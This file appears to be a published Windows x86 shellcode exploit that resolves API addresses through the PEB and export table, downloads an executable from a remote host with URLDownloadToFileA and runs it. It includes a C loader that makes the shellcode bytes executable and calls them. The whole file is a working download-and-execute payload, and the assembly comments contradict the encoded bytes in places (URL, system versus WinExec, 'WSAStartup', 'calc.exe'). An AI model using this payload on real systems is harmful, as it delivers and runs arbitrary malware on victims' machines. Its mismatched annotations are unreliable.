/*

## Exploit Title: Windows 10 / x86 & x64? - URLDownloadToFileA + System execute
## Shellcode Author: Purplezi
## Date: 2020-07-15
## Technique: PEB & Export Directory Table
## Tested On: Windows 10 Pro (x64) 

_start:
; Create a new stack frame
 mov ebp, esp            ; Set base stack pointer for new stack-frame
 sub esp, 0x30           ; Decrement the stack by 3x16 = 48 bytes

; Find kernel32.dll base address
 xor ebx, ebx            ; EBX = 0x00000000
 mov ebx, [fs:ebx+0x30]  ; EBX = Address_of_PEB
 mov ebx, [ebx+0xC]      ; EBX = Address_of_LDR
 mov ebx, [ebx+0x1C]     ; EBX = 1st entry in InitOrderModuleList / ntdll.dll
 mov ebx, [ebx]          ; EBX = 2nd entry in InitOrderModuleList / kernelbase.dll
 mov ebx, [ebx]          ; EBX = 3rd entry in InitOrderModuleList / kernel32.dll
 mov eax, [ebx+0x8]      ; EAX = &kernel32.dll / Address of kernel32.dll
 mov [ebp-0x4], eax      ; [EBP-0x04] = &kernel32.dll

; Find the address of the LoadLibrary Symbol within kernel32.dll
; + The hex values will change with different versions of Windows

; Find the address of the Export Table within kernel32.dll
 mov ebx, [eax+0x3C]     ; EBX = Offset NewEXEHeader  = 0xF8
 add ebx, eax            ; EBX = &NewEXEHeader        = 0xF8 + &kernel32.dll
 mov ebx, [ebx+0x78]     ; EBX = RVA ExportTable      = 0x777B0 = [&NewExeHeader + 0x78]
 add ebx, eax            ; EBX = &ExportTable         = RVA ExportTable + &kernel32.dll

; Find the address of the Name Pointer Table within kernel32.dll
; + Contains pointers to strings of function names - 4-byte/dword entries
 mov edi, [ebx+0x20]     ; EDI = RVA NamePointerTable = 0x790E0
 add edi, eax            ; EDI = &NamePointerTable    = 0x790E0 + &kernel32.dll
 mov [ebp-0x8], edi      ; save &NamePointerTable to stack frame

; Find the address of the Ordinal Table
;   - 2-byte/word entries
 mov ecx, [ebx+0x24]     ; ECX = RVA OrdinalTable     = 0x7A9E8
 add ecx, eax            ; ECX = &OrdinalTable        = 0x7A9E8 + &kernel32.dll
 mov [ebp-0xC], ecx      ; save &OrdinalTable to stack-frame

; Find the address of the Address Table
 mov edx, [ebx+0x1C]     ; EDX = RVA AddressTable     = 0x777CC
 add edx, eax            ; EDX = &AddressTable        = 0x777CC + &kernel32.dll
 mov [ebp-0x10], edx     ; save &AddressTable to stack-frame

; Find Number of Functions within the Export Table of kernel32.dll
 mov edx, [ebx+0x14]     ; EDX = Number of Functions  = 0x642
 mov [ebp-0x14], edx     ; save value of Number of Functions to stack-frame

jmp short functions

findFunctionAddr:
; Initialize the Counter to prevent infinite loop
 xor eax, eax            ; EAX = Counter = 0
 mov edx, [ebp-0x14]     ; get value of Number of Functions from stack-frame
; Loop through the NamePointerTable and compare our Strings to the Name Strings of kernel32.dll
searchLoop:
 mov edi, [ebp-0x8]      ; EDI = &NamePointerTable
 mov esi, [ebp-0x18]     ; ESI = Address of String for the Symbol we are searching for
 xor ecx, ecx            ; ECX = 0x00000000
 cld                     ; clear direction flag - Process strings from left to right
 mov edi, [edi+eax*4]    ; EDI = RVA NameString      = [&NamePointerTable + (Counter * 4)]
 add edi, [ebp-0x4]      ; EDI = &NameString         = RVA NameString + &kernel32.dll
 add cx, 0xF             ; ECX = len("GetProcAddress,0x00") = 15 = 14 char + 1 Null
 repe cmpsb              ; compare first 8 bytes of [&NameString] to "GetProcAddress,0x00"
 jz found                ; If string at [&NameString] == "GetProcAddress,0x00", then end loop
 inc eax                 ; else Counter ++
 cmp eax, edx            ; Does EAX == Number of Functions?
 jb searchLoop           ;   If EAX != Number of Functions, then restart the loop

found:
; Find the address of GetProcAddress by using the last value of the Counter
 mov ecx, [ebp-0xC]      ; ECX = &OrdinalTable
 mov edx, [ebp-0x10]     ; EDX = &AddressTable
 mov ax,  [ecx + eax*2]  ;  AX = ordinalNumber      = [&OrdinalTable + (Counter*2)]
 mov eax, [edx + eax*4]  ; EAX = RVA GetProcAddress = [&AddressTable + ordinalNumber]
 add eax, [ebp-0x4]      ; EAX = &GetProcAddress    = RVA GetProcAddress + &kernel32.dll
 ret

functions:
# Push string "GetProcAddress",0x00 onto the stack
 xor eax, eax            ; clear eax register
 mov ax, 0x7373          ; AX is the lower 16-bits of the 32bit EAX Register
 push eax                ;   ss : 73730000 // EAX = 0x00007373 // \x73=ASCII "s"
 push 0x65726464         ; erdd : 65726464 // "GetProcAddress"
 push 0x41636f72         ; Acor : 41636f72
 push 0x50746547         ; PteG : 50746547
 mov [ebp-0x18], esp      ; save PTR to string at bottom of stack (ebp)
 call findFunctionAddr   ; After Return EAX will = &GetProcAddress
# EAX = &GetProcAddress
 mov [ebp-0x1C], eax      ; save &GetProcAddress

; Call GetProcAddress(&kernel32.dll, PTR "LoadLibraryA"0x00)
 xor edx, edx            ; EDX = 0x00000000
 push edx                ; null terminator for LoadLibraryA string
 push 0x41797261         ; Ayra : 41797261 // "LoadLibraryA",0x00
 push 0x7262694c         ; rbiL : 7262694c
 push 0x64616f4c         ; daoL : 64616f4c
 push esp                ; $hModule    -- push the address of the start of the string onto the stack
 push dword [ebp-0x4]    ; $lpProcName -- push base address of kernel32.dll to the stack
 mov eax, [ebp-0x1C]     ; Move the address of GetProcAddress into the EAX register
 call eax                ; Call the GetProcAddress Function.
 mov [ebp-0x20], eax     ; save Address of LoadLibraryA

; Call LoadLibraryA(PTR "urlmon") 
;   push "urlmon",0x00 to the stack and save pointer
 xor eax, eax            ; clear eax
 mov ax, 0x6E6F          ; on : 6E6F
 push eax
 push 0x6D6C7275         ; mlru : 6D6C7275
 push esp                ; push the pointer to the string
 mov ebx, [ebp-0x20]     ; LoadLibraryA Address to ebx register
 call ebx                ; call the LoadLibraryA Function to load urlmon.dll
 mov [ebp-0x24], eax     ; save Address of urlmon.dll

; Call GetProcAddress(urlmon.dll, "URLDownloadToFileA") 
 xor edx, edx
 mov dx, 0x4165          ; Ae : 4165
 push edx
 push 0x6C69466F         ; liFo : 6c69466f 
 push 0x5464616F         ; Tdao : 5464616f
 push 0x6C6E776F         ; lnwo : 6c6e776f
 push 0x444C5255         ; DLRU : 444c5255
 push esp                ; push pointer to string to stack for 'URLDownloadToFileA'
 push dword [ebp-0x24]   ; push base address of urlmon.dll to stack
 mov eax, [ebp-0x1C]     ; PTR to GetProcAddress to EAX
 call eax                ; GetProcAddress
; EAX = WSAStartup Address
 mov [ebp-0x28], eax     ; save Address of urlmon.URLDownloadToFileA

; URLDownloadToFileA(NULL, URL, save as, 0, NULL)
download:
pop eax
xor ecx, ecx
push ecx
; URL: https://dldir1.qq.com/weixin/Windows/WeChatSetup.exe 
; http s:// dldi r1.q q.co m/we ixin /Win dows /WeC hatS etup .exe
push 0x6578652E         ; exe. : 6578652e
push 0x70757465         ; pute : 70757465
push 0x53746168         ; Stah : 53746168
push 0x6365572F         ; ceW/ : 6365572f
push 0x73776F64         ; swod : 73776f64
push 0x6E69572F         ; niW/ : 6e69572f
push 0x4365572F         ; CeW/ : 4365572f
push 0x73776F64         ; swod : 73776f64
push 0x6E69572F         ; niW/ : 6e69572f
push 0x6E697869         ; nixi : 6e697869
push 0x65772F6D         ; ew/m : 65772f6d
push 0x6F632E71         ; oc.q : 6f632e71
push 0x712E3172         ; q.1r : 712e3172
push 0x69646C64         ; idld : 69646c64
push 0x2F2F3A73         ; //:s : 2f2f3a73
push 0x70747468         ; ptth : 70747468
push esp
pop ecx                 ; save the URL string
xor ebx, ebx
push ebx
; save as test.exe
push 0x6578652E         ; exe. : 6578652e
push 0x74736574         ; tset : 74736574
push esp
pop ebx                 ; save the downloaded filename string
xor edx, edx
push edx
push edx
push ebx
push ecx
push edx
mov eax, [ebp-0x28]     ; PTR to URLDownloadToFileA to EAX
call eax                ; call URLDownloadToFileA function
pop ecx
add esp, 44
xor edx, edx
cmp eax, edx
push ecx
jnz download            ; if it fails to download , retry contineusly
pop edx

; Finding address of System()
; Call LoadLibraryA(PTR "msvcrt")
;   push "msvcrt",0x00 to the stack and save pointer
 xor eax, eax            ; clear eax
 mov ax, 0x7472          ; tr : 7472
 push eax
 push 0x6376736D         ; cvsm : 6376736D
 push esp                ; push the pointer to the string
 mov ebx, [ebp-0x20]     ; LoadLibraryA Address to ebx register
 call ebx                ; call the LoadLibraryA Function to load urlmon.dll
 mov [ebp-0x24], eax     ; save Address of urlmon.dll

; Call GetProcAddress(msvcrt.dll, "system")
 xor edx, edx
 mov dx, 0x6d65          ; me : 6d65
 push edx
 push 0x74737973         ; tsys : 74737973
 push esp                ; push pointer to string to stack for 'system'
 push dword [ebp-0x24]   ; push base address of msvcrt.dll to stack
 mov eax, [ebp-0x1C]     ; PTR to GetProcAddress to EAX
 call eax                ; GetProcAddress
;   EAX = WSAStartup Address
 mov [ebp-0x28], eax     ; save Address of msvcrt.system

; Call system(CmdLine);
; CmdLine = "test.exe"
execute:
pop eax
xor ecx, ecx
push ecx
push 0x6578652E         ; exe. : 6578652e
push 0x70757465         ; tset : 70757465
mov ebx, esp            ; save pointer to "calc.exe" string in eax
call eax

; Create string 'ExitProcess\x00' on the stack and save its address to the stack-frame
 xor ecx, ecx          ; clear eax register
 mov ecx, 0x73736501     ; 73736501 = "sse",0x01 // "ExitProcess",0x0000 string
 shr ecx, 8              ; ecx = "ess",0x00 // shr shifts the register right 8 bits
 push ecx                ;  sse : 00737365
 push 0x636F7250         ; corP : 636F7250
 push 0x74697845         ; tixE : 74697845
 mov [ebp+0x18], esp     ; save address of string 'ExitProcess\x00' to stack-frame
 call findFunctionAddr   ; After Return EAX will = &ExitProcess

; Call ExitProcess(ExitCode)
 xor edx, edx
 push edx                ; ExitCode = 0
 call eax                ; ExitProcess(ExitCode)
*/

//#include <stdio.h>
//#include <Urlmon.h>
//#pragma comment(lib,"Urlmon.lib")
//
//int main()
//{
//    if (URLDownloadToFileA(NULL, "http://192.168.0.105/res.exe", "e:\\test.exe", 0, 0) == S_OK)
//    {
//        printf("URLDownloadToFile OK\n");
//        //system("e:\\test.exe");
//        WinExec("e:\\test.exe", 0);
//        //printf("ret = %d\n", ret);
//    }
//    else
//    {
//        printf("URLDownloadToFile Fail,Error:%d\n", GetLastError());
//    }
//}

#include <Windows.h>
#include <stdio.h>

char code[] = \
"\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41\x8b\x04\x82\x03\x45\xfc\xc3\x31\xc0\x66\xb8\x73\x73\x50\x68\x64\x64\x72\x65\x68\x72\x6f\x63\x41\x68\x47\x65\x74\x50\x89\x65\x18\xe8\xb0\xff\xff\xff\x89\x45\xe4\x31\xd2\x52\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\xff\x75\xfc\x8b\x45\xe4\xff\xd0\x89\x45\xe0\x31\xc0\x66\xb8\x6f\x6e\x50\x68\x75\x72\x6c\x6d\x54\x8b\x5d\xe0\xff\xd3\x89\x45\xdc\x31\xd2\x66\xba\x65\x41\x52\x68\x6f\x46\x69\x6c\x68\x6f\x61\x64\x54\x68\x6f\x77\x6e\x6c\x68\x55\x52\x4c\x44\x54\xff\x75\xdc\x8b\x45\xe4\xff\xd0\x89\x45\xd8\x58\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x2f\x72\x65\x73\x68\x2e\x31\x30\x35\x68\x36\x38\x2e\x30\x68\x39\x32\x2e\x31\x68\x3a\x2f\x2f\x31\x68\x68\x74\x74\x70\x54\x59\x31\xdb\x53\x68\x2e\x65\x78\x65\x68\x74\x65\x73\x74\x54\x5b\x31\xd2\x52\x52\x53\x51\x52\x8b\x45\xd8\xff\xd0\x59\x83\xc4\x2c\x31\xd2\x39\xd0\x51\x75\xb1\x5a\xba\x78\x78\x65\x63\xc1\xea\x08\x52\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xed\xfe\xff\xff\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x74\x65\x73\x74\x89\xe3\x41\x51\x53\xff\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\xbc\xfe\xff\xff\x31\xd2\x52\xff\xd0";

int main(int argc, char** argv)
{
    int (*func)();
    DWORD dwOldProtect;
    //func = (int(*)()) code;
    VirtualProtect(code, sizeof(code), PAGE_EXECUTE_READWRITE, &dwOldProtect);
    func = (int(*)()) code;
    (int)(*func)();
}